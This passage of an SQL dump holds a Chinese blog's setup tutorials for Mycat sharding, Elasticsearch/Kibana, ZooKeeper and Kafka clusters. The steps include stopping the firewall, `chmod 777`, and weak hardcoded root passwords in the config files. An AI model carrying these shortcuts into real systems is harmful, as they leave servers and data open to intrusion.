dataHost：指定逻辑数据节点物理主机节点名称；\n    database：指定物理主机节点上。如果一个节点上有多个库，可使用表达式db$0-99，     表示指定0-99这100个数据库；\n\n    dataHost 节点中各属性说明：\n        name：物理主机节点名称；\n        maxCon：指定物理主机服务最大支持1000个连接；\n        minCon：指定物理主机服务最小保持10个连接；\n        writeType：指定写入类型；\n            0，只在writeHost节点写入；\n            1，在所有节点都写入。慎重开启，多节点写入顺序为默认写入根据配置顺序，第一个挂掉切换另一个；\n        dbType：指定数据库类型；\n        dbDriver：指定数据库驱动；\n        balance：指定物理主机服务的负载模式。  \n            0，不开启读写分离机制；\n            1，全部的readHost与stand by writeHost参与select语句的负载均衡，简单的说，当双主双从模式(M1->S1，M2->S2，并且M1与 M2互为主备)，正常情况下，M2,S1,S2都参与select语句的负载均衡；\n            2，所有的readHost与writeHost都参与select语句的负载均衡，也就是说，当系统的写操作压力不大的情况下，所有主机都可以承担负载均衡；\n            3. 所有读请求随机分发到writeHost对应的readHost执行，writeHost不负担读压力\n-->\n    <dataHost name=\"localhost1\" maxCon=\"1000\" minCon=\"10\" balance=\"3\" writeType=\"0\" dbType=\"mysql\" dbDriver=\"native\" switchType=\"1\"  slaveThreshold=\"100\">\n        <heartbeat>select user()</heartbeat>\n        <!-- 可以配置多个主从 -->\n        <writeHost host=\"hostM1\" url=\"192.168.147.100:3306\" user=\"root\" password=\"1234\">\n            <!-- 可以配置多个从库 -->\n            <readHost host=\"hostS2\" url=\"192.168.147.101:3306\" user=\"root\" password=\"1234\" />\n        </writeHost>\n    </dataHost>\n</mycat:schema>\n```\n#### server.xml配置\n```kotlin\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- - - Licensed under the Apache License, Version 2.0 (the \"License\"); \n	- you may not use this file except in compliance with the License. - You \n	may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0 \n	- - Unless required by applicable law or agreed to in writing, software - \n	distributed under the License is distributed on an \"AS IS\" BASIS, - WITHOUT \n	WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the \n	License for the specific language governing permissions and - limitations \n	under the License. -->\n<!DOCTYPE mycat:server SYSTEM \"server.dtd\">\n<mycat:server xmlns:mycat=\"http://io.mycat/\">\n   <!-- 读写都可用的用户 -->\n    <user name=\"root\" defaultAccount=\"true\">\n        <property name=\"password\">123456</property>\n        <!-- 连接mycat的逻辑库名称 -->\n        <property name=\"schemas\">mycat_testdb</property>\n        <!-- 表级 DML 权限设置 -->\n        <!--        \n        <privileges check=\"false\">\n            <schema name=\"TESTDB\" dml=\"0110\" >\n                <table name=\"tb01\" dml=\"0000\"></table>\n                <table name=\"tb02\" dml=\"1111\"></table>\n            </schema>\n        </privileges>       \n         -->\n    </user>\n\n    <!-- 只读用户 -->\n    <user name=\"user\">\n        <property name=\"password\">123456</property>\n        <property name=\"schemas\">mycat_testdb</property>\n        <property name=\"readOnly\">true</property>\n    </user>\n</mycat:server>\n```\n\n\n### 启动mycat测试\n![TIM截图20190528232554.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528232554.png)\n![TIM截图20190528233016.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528233016.png)\n```kotlin\n// 1. 进入bin目录\ncd mycat/bin/\n\n// 2. 启动mycat\n./mycat start\n\n// 3. 查看日志检查mycat是否启动成功\ncd ../log\ncat wrapper.log\n\n// 关闭mycat\n./mycat stop\n```\n\n![TIM截图20190528232859.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528232859.png)\n![TIM截图20190528233136.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528233136.png)\n![TIM截图20190528233509.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528233509.png)\n![TIM截图20190528233639.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528233639.png)\n\n### 代码整合测试\n![TIM截图20190529195134.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190529195134.png)\n![TIM截图20190529194841.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190529194841.png)\n![TIM截图20190529194744.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190529194744.png)', 0, 0, 39, 0, 0, '2019-05-29 20:03:36', '2019-06-16 13:59:15', 0, 0);
INSERT INTO `article` VALUES (59, 1, 'mycat分表配置', '2019/5/1559223018_d4556b605e5913098c4fb0439d37b43e.jpg', '### 依赖及示范代码\n链接：https://pan.baidu.com/s/1suMGse3US86gKmhvxOdhTw \n提取码：oguc\n\n### 目的\n![splittable.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559224442_splittable.png)\n1. 水平拆分(分表)是把同一个表拆到不同的数据库中,\n2. 相对于垂直拆分(分库),水平拆分不是将表的数据做分类,而是按照某个字段的某种规则来分散到多个库之中,每个表中包含一部分数据\n3. 简单来说,我们可以将数据的水平切分理解为是按照数据行的切分,就是将表中的某些行切分到一个数据库中而另外的某些行又切分到其他的数据库中,主要有分表,分库两种模式\n4. 该方式提高系统的稳定性和负载能力\n5. 若查询时不携带遵循分片策略规则的表字段作为条件,那么将会对集群数据库中所有数据库都进行查询,然后合并数据,效率极差\n6. 跨库join性能差,mycat使用limt查询,那么查出的数据是从集群数据库中随机的,排序后就是固定,且极为耗时\n\n#### mycat所支持的分表分片策略\n1. 求模算法\n2. 分片枚举(常量)\n3. 范围约定\n4. 日期指定\n5. 固定分片hash算法\n6. 通配取模\n7. ascll码求模通配\n8. 编程指定\n9. 字符串拆分hash解析\n\n### 分片枚举常量规则\n#### 什么是分片枚举常量\n1. 分片枚举算法就是根据某表字段不同的枚举(常量),进入分类存储(如地区)\n2. 大多数用于根据手机号,邮政编码来进行分表规则\n\n#### 创建三个数据库与三张相同结构表\n![TIM截图20190529220056.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225203_TIM截图20190529220056.png)\n#### 自定义规则文件\n![TIM截图20190529221156.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225203_TIM截图20190529221156.png)\n![TIM截图20190529225140.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225203_TIM截图20190529225140.png)\n#### schema.xml\n![TIM截图20190529223545.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225203_TIM截图20190529223545.png)\n#### server.xml\n![TIM截图20190529223928.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225203_TIM截图20190529223928.png)\n```kotlin\n// partition-hash-int.txt \nbeijin=0\nshanghai=1\nguangzhou=2\n\n// rule.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- - - Licensed under the Apache License, Version 2.0 (the \"License\");\n    - you may not use this file except in compliance with the License. - You\n    may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0\n    - - Unless required by applicable law or agreed to in writing, software -\n    distributed under the License is distributed on an \"AS IS\" BASIS, - WITHOUT\n    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the\n    License for the specific language governing permissions and - limitations\n    under the License. -->\n<!DOCTYPE mycat:rule SYSTEM \"rule.dtd\">\n<mycat:rule xmlns:mycat=\"http://io.mycat/\">\n    <tableRule name=\"role2\">\n             <rule>\n                  <columns>name</columns>\n                <algorithm>hash-int</algorithm>\n                </rule>\n    </tableRule>\n	<function name=\"hash-int\" class=\"io.mycat.route.function.PartitionByFileMap\">\n		<property name=\"mapFile\">partition-hash-int.txt</property>\n        <!-- 数值类型: 0-->\n        <!-- 非数值类型: 1 -->\n		<property name=\"type\">1</property>\n        <!-- 如果不满足partition-hash-int.txt中北上广 \n             默认存放至北京->0\n            -->\n		<property name=\"defaultNode\">0</property>\n	</function>\n</mycat:rule>\n\n// schema.xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE mycat:schema SYSTEM \"schema.dtd\">\n<mycat:schema xmlns:mycat=\"http://io.mycat/\">\n    <!-- TESTDB1 是mycat的逻辑库名称，链接需要用的 -->\n    <schema name=\"mycat_testdb\" checkSQLschema=\"false\" sqlMaxLimit=\"100\" dataNode=\"dn1\">\n	  <table name=\"order_info\"  dataNode=\"dn1,dn2,dn3\" rule=\"role2\" /> \n	</schema>\n        <!-- database 是MySQL数据库的库名 -->\n    <dataNode name=\"dn1\" dataHost=\"localhost1\" database=\"user_db1\" />\n	<dataNode name=\"dn2\" dataHost=\"localhost1\" database=\"user_db2\" />\n	<dataNode name=\"dn3\" dataHost=\"localhost1\" database=\"user_db3\" />\n    <!--\n    dataNode节点中各属性说明：\n    name：指定逻辑数据节点名称；\n    dataHost：指定逻辑数据节点物理主机节点名称；\n    database：指定物理主机节点上。如果一个节点上有多个库，可使用表达式db$0-99，     表示指定0-99这100个数据库；\n    dataHost 节点中各属性说明：\n        name：物理主机节点名称；\n        maxCon：指定物理主机服务最大支持1000个连接；\n        minCon：指定物理主机服务最小保持10个连接；\n        writeType：指定写入类型；\n            0，只在writeHost节点写入；\n            1，在所有节点都写入。慎重开启，多节点写入顺序为默认写入根据配置顺序，第一个挂掉切换另一个；\n        dbType：指定数据库类型；\n        dbDriver：指定数据库驱动；\n        balance：指定物理主机服务的负载模式。\n            0，不开启读写分离机制；\n            1，全部的readHost与stand by writeHost参与select语句的负载均衡，简单的说，当双主双从模式(M1->S1，M2->S2，并且M1与 M2互为主备)，正常情况下，M2,S1,S2都参与select语句的负载均衡；\n            2，所有的readHost与writeHost都参与select语句的负载均衡，也就是说，当系统的写操作压力不大的情况下，所有主机都可以承担负载均衡；\n-->\n    <dataHost name=\"localhost1\" maxCon=\"1000\" minCon=\"10\" balance=\"3\" writeType=\"0\" dbType=\"mysql\" dbDriver=\"native\" switchType=\"1\"  slaveThreshold=\"100\">\n        <heartbeat>select user()</heartbeat>\n        <!-- 可以配置多个主从 -->\n        <writeHost host=\"hostM1\" url=\"192.168.147.100:3306\" user=\"root\" password=\"1234\">\n            <!-- 可以配置多个从库 -->\n            <readHost host=\"hostS2\" url=\"192.168.147.101:3306\" user=\"root\" password=\"1234\" />\n        </writeHost>\n    </dataHost>\n</mycat:schema>\n\n// server.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- - - Licensed under the Apache License, Version 2.0 (the \"License\"); \n	- you may not use this file except in compliance with the License. - You \n	may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0 \n	- - Unless required by applicable law or agreed to in writing, software - \n	distributed under the License is distributed on an \"AS IS\" BASIS, - WITHOUT \n	WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the \n	License for the specific language governing permissions and - limitations \n	under the License. -->\n<!DOCTYPE mycat:server SYSTEM \"server.dtd\">\n<mycat:server xmlns:mycat=\"http://io.mycat/\">\n   <!-- 读写都可用的用户 -->\n    <user name=\"root\" defaultAccount=\"true\">\n        <property name=\"password\">123456</property>\n        <property name=\"schemas\">mycat_testdb</property>\n\n        <!-- 表级 DML 权限设置 -->\n        <!--        \n        <privileges check=\"false\">\n            <schema name=\"TESTDB\" dml=\"0110\" >\n                <table name=\"tb01\" dml=\"0000\"></table>\n                <table name=\"tb02\" dml=\"1111\"></table>\n            </schema>\n        </privileges>       \n         -->\n    </user>\n    <!-- 只读用户 -->\n    <user name=\"user\">\n        <property name=\"password\">123456</property>\n        <property name=\"schemas\">mycat_testdb</property>\n        <property name=\"readOnly\">true</property>\n    </user>\n</mycat:server>\n```\n\n#### 启动mycat并查看效果\n![TIM截图20190530205723.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225364_TIM截图20190530205723.png)\n![TIM截图20190529231412.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225364_TIM截图20190529231412.png)\n\n### id取模规则\n#### 什么是id取模规则\n1. 取模算法就是根据模运算进行拆分分发,例如对id进行取模运算进行分表,取模值一旦确定就不允许更改\n\n![TIM截图20190530204344.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225656_TIM截图20190530204344.png)\n#### rule.xml\n![TIM截图20190530204751.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225656_TIM截图20190530204751.png)\n#### shcema.xml\n![TIM截图20190530205319.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225656_TIM截图20190530205319.png)\n![TIM截图20190530211104.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225656_TIM截图20190530211104.png)\n```kotlin\n// rule.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- - - Licensed under the Apache License, Version 2.0 (the \"License\");\n    - you may not use this file except in compliance with the License. - You\n    may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0\n    - - Unless required by applicable law or agreed to in writing, software -\n    distributed under the License is distributed on an \"AS IS\" BASIS, - WITHOUT\n    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the\n    License for the specific language governing permissions and - limitations\n    under the License. -->\n<!DOCTYPE mycat:rule SYSTEM \"rule.dtd\">\n<mycat:rule xmlns:mycat=\"http://io.mycat/\">\n   <tableRule name=\"role1\">\n        <rule>\n            <columns>id</columns>\n            <algorithm>mod-long</algorithm>\n        </rule>\n    </tableRule>\n \n    <function name=\"mod-long\" class=\"io.mycat.route.function.PartitionByMod\">\n        <!--指定分片数量，不可以被更改-->\n        <property name=\"count\">3</property>\n</function>	\n</mycat:rule>\n\n// schema.xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE mycat:schema SYSTEM \"schema.dtd\">\n<mycat:schema xmlns:mycat=\"http://io.mycat/\">\n    <!-- TESTDB1 是mycat的逻辑库名称，链接需要用的 -->\n    <schema name=\"mycat_testdb\" checkSQLschema=\"false\" sqlMaxLimit=\"100\" dataNode=\"dn1\">\n	<table name=\"user_info\" dataNode=\"dn1,dn2,dn3\" rule=\"role1\"/>\n	</schema>\n        <!-- database 是MySQL数据库的库名 -->\n    <dataNode name=\"dn1\" dataHost=\"localhost1\" database=\"user_db1\" />\n	<dataNode name=\"dn2\" dataHost=\"localhost1\" database=\"user_db2\" />\n	<dataNode name=\"dn3\" dataHost=\"localhost1\" database=\"user_db3\" />\n    <!--\n    dataNode节点中各属性说明：\n    name：指定逻辑数据节点名称；\n    dataHost：指定逻辑数据节点物理主机节点名称；\n    database：指定物理主机节点上。如果一个节点上有多个库，可使用表达式db$0-99，     表示指定0-99这100个数据库；\n    dataHost 节点中各属性说明：\n        name：物理主机节点名称；\n        maxCon：指定物理主机服务最大支持1000个连接；\n        minCon：指定物理主机服务最小保持10个连接；\n        writeType：指定写入类型；\n            0，只在writeHost节点写入；\n            1，在所有节点都写入。慎重开启，多节点写入顺序为默认写入根据配置顺序，第一个挂掉切换另一个；\n        dbType：指定数据库类型；\n        dbDriver：指定数据库驱动；\n        balance：指定物理主机服务的负载模式。\n            0，不开启读写分离机制；\n            1，全部的readHost与stand by writeHost参与select语句的负载均衡，简单的说，当双主双从模式(M1->S1，M2->S2，并且M1与 M2互为主备)，正常情况下，M2,S1,S2都参与select语句的负载均衡；\n            2，所有的readHost与writeHost都参与select语句的负载均衡，也就是说，当系统的写操作压力不大的情况下，所有主机都可以承担负载均衡；\n-->\n    <dataHost name=\"localhost1\" maxCon=\"1000\" minCon=\"10\" balance=\"3\" writeType=\"0\" dbType=\"mysql\" dbDriver=\"native\" switchType=\"1\"  slaveThreshold=\"100\">\n        <heartbeat>select user()</heartbeat>\n        <!-- 可以配置多个主从 -->\n        <writeHost host=\"hostM1\" url=\"192.168.147.100:3306\" user=\"root\" password=\"1234\">\n            <!-- 可以配置多个从库 -->\n            <readHost host=\"hostS2\" url=\"192.168.147.101:3306\" user=\"root\" password=\"1234\" />\n        </writeHost>\n    </dataHost>\n</mycat:schema>\n```', 0, 0, 39, 0, 0, '2019-05-30 21:30:31', '2019-06-16 13:58:36', 0, 0);
INSERT INTO `article` VALUES (60, 1, 'elasticsearch单机与集群搭建', '2019/6/1559483105_116C1388F926CE0B140BF658D3271746.jpg', '### 依赖及示范代码\n链接：https://pan.baidu.com/s/19IN-4QfvHPWHmje9jBivog \n提取码：v2h5 \n\n### 单节点安装\n#### 修改/config/elasticsearch.yml\n![TIM截图20190601205415.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483816_TIM截图20190601205415.png)\n![TIM截图20190601210517.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483816_TIM截图20190601210517.png)\n![TIM截图20190601210420.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483816_TIM截图20190601210420.png)\n```c++\n// 1. 修改es目录的/config/elasticsearch.yml\nvi config/elasticsearch.yml\n// 修改内容\n// 修改为此es服务的服务器地址\nnetwork.host: 192.168.147.102\n// 删掉#注释,开放9200的http操作端口\nhttp.port: 9200\n```\n#### 修改/etc/sysctl.conf\n![TIM截图20190601212633.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601212633.png)\n```c++\n// 1. 修改/etc/sysctl.conf\nvi /etc/sysctl.conf\n// 添加内容\nvm.max_map_count=655360\n\n// 2. 让系统重新读取刷新配置文件\nsystctl -p\n```\n\n#### 修改/etc/security/limits.conf\n![TIM截图20190601214701.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601214701.png)\n![TIM截图20190601214423.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601214423.png)\n```c++\n// 1. 修改/etc/security/limits.conf\nvi /etc/security/limits.conf\n// 添加内容\n* soft nofile 65536\n* hard nofile 131072\n* soft nproc 2048\n* hard nproc 4096\n\n// 2. 重新启动服务器\nreboot\n```\n#### es启动错误root用户无法启动问题解决\n![TIM截图20190601211042.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601211042.png)\n![TIM截图20190601211908.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601211908.png)\n```c++\n// es不允许使用root用户进行启动\n// 需要创建一个系统用户进行启动\n\n// 1. 添加用户组\ngroupadd esusergroup\n\n// 2. 添加用户并将用户编入刚创建的用户组中\nuseradd tuwq -g esusergroup -p 123456\n\n// 3. 进入es上层目录\ncd /usr/local\n\n// 4. 将es目录操作权限赋予刚创建的用户\nchown -R tuwq:esusergroup elasticsearch-6.4.3\n```\n#### 启动es并检查是否启动成功\n![TIM截图20190601215906.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601215906.png)\n![TIM截图20190601215758.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601215758.png)\n```c++\n// 1. 进入es的bin目录\ncd bin/\n\n// 2. 关闭防火墙\nsystemctl stop firewalld\n\n// 3. 切换为刚创建的用户\nsu tuwq\n\n// 4. 启动es\n./elasticsearch\n\n// 5. 访问es检查是否启动成功\n192.168.147.102:9200\n```\n\n### 安装kibana\n#### 修改kibana目录的config/kibana.yml\n![TIM截图20190601220748.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601220748.png)\n![TIM截图20190601220645.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601220645.png)\n```c++\n// 1. 修改kibana目录的config/kibana.yml\nvi kibana.yml\n// 修改内容\n// kibana开放访问的端口\nserver.port: 5601\n// 本服务的服务器地址\nserver.host: \"192.168.147.102\"\n// es服务所在的服务地址\nelasticsearch.url: \"http://192.168.147.102:9200\"\n```\n\n#### 启动kibana并检查是否启动成功\n![TIM截图20190601224928.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601224928.png)\n![TIM截图20190601221030.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601221030.png)\n```c++\n// 1. 进入kibana的bin目录\ncd bin/\n\n// 2. 启动kibana\n./kibana\n\n// 3. 检查kibana是否启动成功\n192.168.147.102:5601\n```\n### 安装IK中文分词器\n![TIM截图20190602200020.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559487218_TIM截图20190602200020.png)\n![TIM截图20190602200124.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559487218_TIM截图20190602200124.png)\n```c++\n// 1. 将ik插件放入es的plugins目录中\nmv ik elasticsearch-6.4.3/plugins\n\n// 2. 切换用户启动es\nsu tuwq\n\n// 3. 启动es\n./elasticsearch\n\n// 4. 进入kibana检查ik中文分词器是否安装成功\nGET _cat/plugins\n```\n#### IK分词器如何添加字典\n![TIM截图20190602201119.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559487218_TIM截图20190602201119.png)\n\n### 集群搭建\n![TIM截图20190603203200.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559565180_TIM截图20190603203200.png)\n![TIM截图20190603201542.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559565181_TIM截图20190603201542.png)\n![TIM截图20190603201711.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559565181_TIM截图20190603201711.png)\n![TIM截图20190603202542.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559565181_TIM截图20190603202542.png)\n```c++\n// 1. 修改config/elasticsearch.yml\nvi elasticsearch.yml\n// 修改内容\n// 集群名称,各节点必须一致\ncluster.name: my_cluster\n// 节点名称,各节点必须唯一,不能重复\nnode.name: node-1\n// 本节点的服务地址,各节点必须唯一,不能重复\nnetwork.host: 192.168.147.101\n// 参与集群的节点服务列表\ndiscovery.zen.ping.unicast.hosts: [\"192.168.147.101\", \"192.168.147.102\"]\n// 主节点个数1\ndiscovery.zen.minimum_master_nodes: 1\n```\n#### 克隆虚拟机导致es集群启动失败问题\n![TIM截图20190603204628.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559566072_TIM截图20190603204628.png)\n```c++\n// 克隆虚拟机修改elasticsearch.yml配置文件启动报错\n// 原因可能是克隆的data目录有相同节点数据\n// 导致集群启动失败\n\n// 1. 删除data目录\nrm -rf data/\n```', 0, 0, 44, 0, 0, '2019-06-02 21:45:20', '2019-06-16 13:57:45', 0, 0);
INSERT INTO `article` VALUES (61, 1, 'zookeeper单机与集群搭建', '2019/6/1560002663_F1E29B8D8723F0C3AF86DE6BD4DAFD81.jpg', '### 依赖及示范代码\n链接：https://pan.baidu.com/s/17dq7R3PvKxuF5zljGoVCyA \n提取码：1vde\n\n### 单机版安装\n#### 修改conf/zoo.cfg\n![TIM截图20190604225914.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560003383_TIM截图20190604225914.png)\n```c++\n// 1. 进入conf目录\ncd conf\n\n// 2. 将zoo_sample.cfg更名为zoo.cfg\nmv zoo_sample.cfg zoo.cfg\n\n// 3. 修改zoo.cfg内容\nvi zoo.cfg\n// 修改dataDir目录位置\ndataDir=/usr/local/zookeeper/data \n```\n#### 配置环境变量\n![TIM截图20190608181308.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560003384_TIM截图20190608181308.png)\n![TIM截图20190608181146.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560003384_TIM截图20190608181146.png)\n```c++\n// 1. 添加zookeeper环境配置\nvi /etc/profile\n// 添加内容,根据自身服务安装情况调整\nexport JAVA_HOME=/usr/jdk/jdk1.8.0_191\nexport ZOOKEEPER_HOME=/usr/local/zookeeper\nexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\nexport PATH=$PATH:$ZOOKEEPER_HOME/bin:$JAVA_HOME/bin\n\n// 2. 系统重新读取/etc/profile\nsource /etc/profile\n```\n#### 启动zookeeper\n![TIM截图20190608172019.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560003383_TIM截图20190608172019.png)\n```c++\n// 1. 进入zookeeper目录创建data目录\ncd zookeeper\nmkdir data\n\n// 2. 进入bin目录\ncd bin\n\n// 3. 赋予zkServer.sh操作权限\nchmod 777 zkServer.sh\n\n// 4. 启动zookeeper\n./zkServer.sh start\n\n// 5. 查看zookeeper启动状态,出现Mode,说明启动成功\n./zkServer.sh status\n\n// 6. 关闭防火墙,使得允许外部访问\nsystemctl stop firewalld\n```\n\n### 集群安装\n#### 修改conf/zoo.cfg\n![TIM截图20190608174215.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560004278_TIM截图20190608174215.png)\n![TIM截图20190608174141.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560004278_TIM截图20190608174141.png)\n```c++\n// 1. 修改zoo.cfg文件\nvi zoo.cfg\n// 添加参与集群的节点信息\nserver.0=192.168.147.100:2888:3888\nserver.1=192.168.147.101:2888:3888\nserver.2=192.168.147.102:2888:3888\n```\n#### 创建节点id文件\n![TIM截图20190608174624.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560004278_TIM截图20190608174624.png)\n```c++\n// 1. 进入data目录\ncd data\n\n// 2. 创建myid文件 \nvi myid\n// 添加内容,根据该节点的id\n// 192.168.147.100 - 0\n// 192.168.147.101 - 1\n// 192.168.147.102 - 2\n```\n#### 启动检查集群是否成功\n![TIM截图20190608175542.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560004278_TIM截图20190608175542.png)\n```c++\n// 1. 进入bin目录\ncd bin\n\n// 2. 关闭防火墙,使得允许节点间及外部访问\nsystemctl stop firewalld\n\n// 3. 依次启动三台节点\n./zkServer.sh start\n\n// 4. 查看各节点的身份,应为一主两从\n./zkServer.sh status\n```\n\n#### 克隆虚拟机的问题\n![TIM截图20190608175934.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560004278_TIM截图20190608175934.png)\n```c++\n// 若是克隆的虚拟机,那么要删除data目录的zookeeper_server.pid,因为这会影响节点的唯一性\ncd data\nrm -rf zookeeper_server.pid\n```', 0, 0, 36, 0, 0, '2019-06-08 22:04:37', '2019-06-16 13:57:16', 0, 0);
INSERT INTO `article` VALUES (62, 1, 'kafka单机与集群搭建', '2019/6/1560005110_7A3610BB03BBCCD00B0EEA5C604FE831.jpg', '### 依赖及示范代码\n链接：https://pan.baidu.com/s/1EpmBoFe0OdAiD5cIzQp_wQ \n提取码：yigs \n\n### 单机版安装\n#### 修改config/server.properties\n![TIM截图20190608195838.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608195838.png)\n![TIM截图20190608210558.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608210558.png)\n![TIM截图20190608195754.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005279_TIM截图20190608195754.png)\n```c++\n// 1. 进入config目录\ncd config \n\n// 2. 修改server.properties\nvi server.properties\n// 修改内容\n// 节点的id,单机下随意\nbroker.id=0\n// kafka所依赖的协议,填写本服务器的服务地址信息\nlisteners=PLAINTEXT://192.168.147.100:9092\n// zookeeper的连接地址,zookeeper集群情况以逗号分隔填写\nzookeeper.connect=192.168.147.100:2181\n```\n\n#### 配置环境变量\n![TIM截图20190608205610.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608205610.png)\n![TIM截图20190608205453.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608205453.png)\n```c++\n// 1. 修改/etc/profile文件内容\nvi /etc/profile\n// 修改内容,根据自身服务安装情况调整\nexport JAVA_HOME=/usr/jdk/jdk1.8.0_191\nexport ZOOKEEPER_HOME=/usr/local/zookeeper\nexport KAFKA_HOME=/usr/local/kafka\nexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\nexport PATH=$PATH:$ZOOKEEPER_HOME/bin:$JAVA_HOME/bin:$KAFKA_HOME/bin \n\n// 2. 让系统重新读取/etc/profile\nsource /etc/profile\n```\n#### 启动kafka\n![TIM截图20190608210007.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608210007.png)\n![TIM截图20190608210418.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608210418.png)\n```c++\n// 1. 进入bin目录\ncd bin\n\n// 2. 关闭防火墙,使得允许外部访问\nsystemctl stop firewalld\n\n// 3. 指定配置文件启动kafka\n./kafka-server-start.sh -daemon ../config/server.properties\n\n// 4. 进入logs日志目录\ncd ../logs/\n\n// 5. 查看启动日志,检查kafka是否启动成功\ncat server.log\n```\n#### 检查kafka订阅主题功能\n![TIM截图20190608211211.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608211211.png)\n```c++\n// 1. 进入bin目录\ncd bin\n\n// 2. 创建订阅主题\n./kafka-topics.sh --create --zookeeper 192.168.147.100:2181 --replication-factor 1 --partitions 1 --topic single-topic-test\n\n// 3. 查看刚刚创建的订阅主题,有信息说明订阅主题功能没问题\n./kafka-topics.sh --describe --zookeeper 192.168.147.100:2181 --topic single-topic-test\n```\n\n### 集群安装\n#### 修改config/server.properties\n![TIM截图20190608230711.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560006547_TIM截图20190608230711.png)\n![TIM截图20190608212409.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560006326_TIM截图20190608212409.png)\n![TIM截图20190608215818.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560006326_TIM截图20190608215818.png)\n```c++\n// 1. 修改config/server.properteis文件\nvi server.properteis\n// 修改内容\n// kafka各节点的id,各节点必须唯一,不允许重复\nbroker.id=1\n// 本服务节点的服务器地址信息\nlisteners=PLAINTEXT://192.168.147.100:9092\n// zookeeper连接地址,各节点必须填写一致,zookeepeer集群情况已逗号分隔\nzookeeper.connect=192.168.147.100:2181\n```\n#### 